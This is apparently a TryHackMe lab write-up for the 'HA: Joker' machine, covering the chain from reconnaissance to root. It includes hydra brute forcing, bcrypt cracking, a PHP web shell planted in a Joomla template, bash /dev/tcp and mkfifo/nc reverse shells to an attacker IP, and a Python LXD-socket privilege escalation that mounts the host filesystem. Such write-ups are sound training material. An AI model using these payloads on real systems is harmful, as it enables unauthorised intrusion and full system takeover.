#  Privilege Escalation via Snap Confinement Bypass (LXD API Socket)

## 1. Initial Reconnaissance & Enumeration

An initial Nmap scan was performed to profile open ports, running services, and application versions on the target machine.

Bash

```
nmap -sV -sC 10.49.184.245
```

The scan revealed three active ports:

- **Port 22:** OpenSSH 8.2p1
    
- **Port 80:** Apache httpd 2.4.41 (Title: `HA: Joker`)
    
- **Port 8080:** Apache httpd 2.4.41 (Returns an HTTP Basic Authentication `401 Unauthorized` prompt)
    

### Web Directory Fuzzing

Directory discovery was conducted on port 80 using `ffuf` to uncover hidden files or interesting pathways.

Bash

```
ffuf -u http://10.49.184.245/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.bak,.old -mc 200,301,302,403
```

This discovery yielded two key files:

- `/phpinfo.php`: Confirmed that code execution functions like `system()`, `exec()`, and `shell_exec()` were active on the server.
    
- `/secret.txt`: Contained a thematic dialogue between Batman and the Joker. The repetitive use of words like _"rock"_, _"break me"_, and _"dumb as a rock"_ strongly implied that a dictionary attack using the `rockyou.txt` wordlist would be effective.
    

## 2. Vulnerability 1: Weak Passwords & Sensitive Backups Exposed

The first major security flaw on this machine was a combination of guessable credentials and poorly protected application archives on port 8080.

### Brute-Forcing HTTP Basic Auth

With port 8080 requesting basic authentication, a network brute-force attack was launched via `hydra` using the username `joker` and the `rockyou.txt` wordlist, as hinted by `secret.txt`.

Bash

```
hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.49.184.245 -s 8080 http-get /
```

> **Recovered Web Credentials:** `joker:hannah`

### Exfiltrating the Joomla Backup Archive

After logging into port 8080, an authenticated directory fuzzing scan exposed an uncompressed web backup directory containing a 12MB file named `backup`.

Leaving full site backups publicly accessible creates a massive domino effect, as it exposes the website's inner workings. The archive was downloaded and extracted locally:

Bash

```
wget -q --user=joker --password=hannah http://10.49.184.245:8080/backup -O backup.file
unzip backup.file -d backup_extracted/
```

Reviewing the extracted files leaked highly sensitive data:

- `site/configuration.php`: Contained internal site parameters, leaking a weak database password (`1234`) for a user named `joomla`.
    
- `db/joomladb.sql`: A full MySQL database dump containing the `cc1gr_users` table with the encrypted administrator password hash.
    

Bash

```
grep -A5 "INSERT INTO \`cc1gr_users\`" db/joomladb.sql
```

SQL

```
INSERT INTO cc1gr_users VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',...);
```

### Reversing the Administrator Hash

The target hash used a Blowfish/Bcrypt (`$2y$`) implementation. Because the admin used a weak, easily guessable password string, John the Ripper cracked it in under a minute:

Bash

```
echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

> **Cracked CMS Administrative Password:** `admin:abcd1234`

## 3. Initial Access & Shell Stabilization

Using the cracked administrative credentials, a reverse shell was obtained by leveraging Joomla's native template management features.

1. Authenticated to the Joomla administrator console at `/administrator` using `admin:abcd1234`.
    
2. Navigated to **Extensions** $\rightarrow$ **Templates** $\rightarrow$ **Templates** $\rightarrow$ **Protostar Details and Files**.
    
3. Selected `index.php` and embedded a persistent web shell command hook at the top of the file layout:
    
    PHP
    
    ```
    <?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
    ```
    

```
4.  Saved the template modification and triggered an interactive reverse shell back to a Penelope shell handler listener on Kali:
    ```bash
    curl -u joker:hannah "http://10.49.184.245:8080/index.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.132.218/4444+0>%261'"
```

The incoming connection was caught, providing initial low-privilege command access as `www-data`.

## 4. Environment Constraints: The Snap Packaging Issue

Checking user permissions with the `id` command confirmed that `www-data` belonged to the `lxd` local system group (`gid=115`). LXD is a management tool used to create isolated virtual systems or mini-computers (containers) inside Linux.

Normally, group membership allows for rapid container-based root privilege escalation. However, trying to run any standard client utility check resulted in an AppArmor denial:

Bash

```
www-data@ip-10-49-165-161:/opt/joomla$ lxc image list
Sorry, home directories outside of /home needs configuration.
See https://forum.snapcraft.io/t/11209 for details.
```

### Why Standard Commands Failed

On modern Ubuntu deployments, LXD is distributed via **Snap packaging**, which runs within a strict security sandbox. When executing the front-door `lxc` command-line utility, the snap daemon checks the real system home directory assigned within `/etc/passwd`.

Because `www-data` defaults to the web server path (`/var/www`), which sits outside the standard `/home/` prefix, the sandbox environment gets triggered and locks up the command-line utility. Standard path spoofing tricks like exporting a fake `$HOME` environment variable are ignored by Snap.

## 5. Vulnerability 2: LXD Group Misconfiguration & Socket Exposure

The core vulnerability here is a major architectural bypass: **Snap’s home directory sandboxing only restricts the front-door client binary (`lxc`), not the underlying background communication path (the Unix socket file).**

Because the administrators assigned our low-privilege account (`www-data`) to the `lxd` group, we still possessed raw read/write permissions to talk directly to the background hypervisor daemon via the Unix socket file. By avoiding the broken command-line tool completely, we can use a custom script to speak raw HTTP directly to the socket.

## 6. Exploit Script Analysis & Root Reverse Shell

A tailored Python script was executed to interact directly with the socket file (`/var/snap/lxd/common/lxd/unix.socket`), issuing raw API instructions to build a privileged backdoor container and mount the host's drive.

### Python Script Breakdown

#### Step 1: Verifying Socket Communication

First, a manual connection check was sent to ensure the daemon would accept direct HTTP requests from `www-data`:

Bash

```
python3 -c '
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/var/snap/lxd/common/lxd/unix.socket")
s.sendall(b"GET /1.0 HTTP/1.0\r\n\r\n")
print(s.recv(1024).decode())
'
```

The socket successfully returned a detailed JSON array, proving we could bypass the client restrictions entirely. An Alpine rootfs exploit image was then successfully imported, returning the identity fingerprint hash `cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b`.

#### Step 2: Creating the Privileged Container Framework

The script issued a `POST` request to provision a new container instance named `privsec`:

Python

```
send("POST", "/1.0/instances", {
    "name": "privsec", 
    "source": {"type": "image", "fingerprint": FINGERPRINT}, 
    "config": {"security.privileged": "true"}
})
```

By setting `"security.privileged": "true"`, the script disabled the container's security safety features, turning it into a "super-container" capable of interacting directly with the core operating system hardware.

#### Step 3: Mapping the Host Drive (The Master Trick)

Next, the script issued a `PATCH` request to alter the hardware configuration of our new container:

Python

```
send("PATCH", "/1.0/instances/privsec", {
    "devices": {
        "bypass": {
            "type": "disk", 
            "source": "/", 
            "path": "/mnt/root", 
            "recursive": "true"
        }
    }
})
```

This is the core of the privilege escalation. It instructed LXD to take the actual, real hard drive of the victim host computer (the source `/`) and plug it directly into the container's internal filesystem layout at `/mnt/root`. Because the container was set as privileged, LXD allowed this drive mapping without restriction.

#### Step 4: Activating the Instance

Finally, a `PUT` request triggered the virtual power button, booting up the backdoor container with the host's operating system strapped to its back:

Python

```
send("PUT", "/1.0/instances/privsec/state", {"action": "start"})
```

## 7. Flag Recovery via Container Shell Escape

With the container active, a final instruction payload was sent to the socket API, commanding the instance to run a reverse shell payload back to our Kali listener on port `4445`:

Bash

```
python3 -c '
import socket, json
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/var/snap/lxd/common/lxd/unix.socket")
payload = {
    "command": ["sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.132.218 4445 >/tmp/f"],
    "environment": {}, "wait-for-websocket": False, "interactive": False
}
body = json.dumps(payload)
s.sendall(f"POST /1.0/instances/privsec/exec HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: {len(body)}\r\n\r\n{body}".encode())
'
```

### Why the Shell Granted Root Authority

By architectural design, when a fresh Alpine Linux container boots up, its default active internal execution user is `root`. Therefore, when the container processed our command and hooked back to Kali, the incoming shell ran with absolute administrative privileges (`#`) inside the container environment.

### Reaching Through the Portal

Even though the shell was technically confined inside the mini-container, the host's physical file system was completely exposed via the `/mnt/root` folder mapped during Step 3.

By navigating through this directory portal, the container shell possessed the absolute authority to read the main server's restricted administration directories, allowing for immediate retrieval of the final flag file.

Plaintext

```
┌──(aj㉿kali)-[~/labs]
└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [192.168.132.218] from (UNKNOWN) [10.49.165.161] 37183
sh: can't access tty; job control turned off

/root # cd /mnt/root/root
/mnt/root/root # ls -la
total 44
drwx------    7 root     root          4096 Oct 22  2025 .
-rw-r--r--    1 root     root          1003 Oct  8  2019 final.txt

/mnt/root/root # cat final.txt
```

Plaintext

```
     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                         
!! Congrats you have finished this task !!
```
🧑‍💻  https://tryhackme.com/p/4thul.exe